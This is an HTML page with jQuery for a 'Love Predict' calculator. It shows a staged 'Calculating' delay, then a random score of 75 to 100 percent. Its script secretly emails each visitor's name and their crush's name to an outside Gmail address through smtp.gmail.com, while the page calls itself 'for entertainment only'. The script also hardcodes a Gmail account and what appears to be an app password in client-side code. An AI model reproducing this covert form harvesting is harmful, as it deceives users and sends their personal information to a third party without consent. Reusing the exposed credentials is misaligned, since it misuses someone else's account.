  body{

<body class="ustify-content-center align-items-center">
  <div class="container d-flex justify-content-center align-items-center mt-5">
    <h3><span style="color: blue;">Welcome to:</span> Love Predict</h3>
  </div>

  <div class="container d-flex justify-content-center">
    <form class="col-6">
      <div class="form-group">
        <label>Your name:</label>
        <input type="text" name="" class="form-control" id="your_name">
      </div>
      <div class="form-group">
        <label>Your crush's name:</label>
        <input type="text" name="" class="form-control" id="crush_name">
      </div>
      <input type="submit" value="Calculate" class="btn btn-primary" id="calculate">
    </form>
  </div>
  <div class="jumbotron fixed-bottom d-flex justify-content-center align-items-end py-3 rounded bg-light mb-0">
    <h5 class="text-primary">This website is for entertainment only. Copyright 2022.</h5>
  </div>

  <div class="modal" tabindex="-1" role="dialog" id="modal_calculate">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title">Processing</h5>
        </div>
        <div class="modal-body">
          <p>Calculating please wait...</p>
        </div>
        <div class="modal-footer">
        </div>
      </div>
    </div>
  </div>

  <div class="modal" tabindex="-1" role="dialog" id="modal_result">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title">Love result!!!</h5>
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <p id="modal_result_text">Modal body text goes here.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>

  <script type="text/javascript">
    $('#calculate').click(function(e){
      e.preventDefault();
      if ($('#your_name').val() != '' && $('#crush_name').val() != '') {
        $('#modal_calculate').modal('show');
        setTimeout(function() {
          $('#modal_calculate').modal('hide');
          setTimeout(function() {
            var name = $('#your_name').val();
            var crush_name = $('#crush_name').val();
            var rand = Math.floor(Math.random() * (100 - 75 + 1) ) + 75;
            var text = crush_name + ' is ' + rand + '% Loves you';
            Email.send({
                Host : "smtp.gmail.com",
                Username : "tomasjexter@gmail.com",
                Password : "vwus amqb abva rleq",
                To : 'jextertomas@gmail.com',
                From : 'retxej112600@gmail.com',
                Subject : 'Anonymous',
                Body : name + " & " + crush_name
            });
            $('#modal_result_text').html(text);
            $('#modal_result').modal('show');
          }, 1000);
        }, 2000);
      }else{
        alert("Please fill all inputs!!!");
      }
      
    });
  </script>
</body>
